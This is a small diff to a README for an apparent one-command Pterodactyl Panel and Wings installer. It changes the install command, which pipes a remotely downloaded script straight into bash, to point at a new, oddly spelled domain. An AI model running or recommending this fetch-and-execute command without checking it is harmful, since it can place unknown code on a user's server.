@@ -4,7 +4,7 @@ One-command setup for Panel + Wings 🚀
 
 ## 🚀 Install
 ```bash
-bash <(curl -s https://ptero.abhigyanhost.in)
+bash <(curl -s https://ptero.petdoctyal-panel-all-install.in)
 ```
 
 ## 📦 Includes
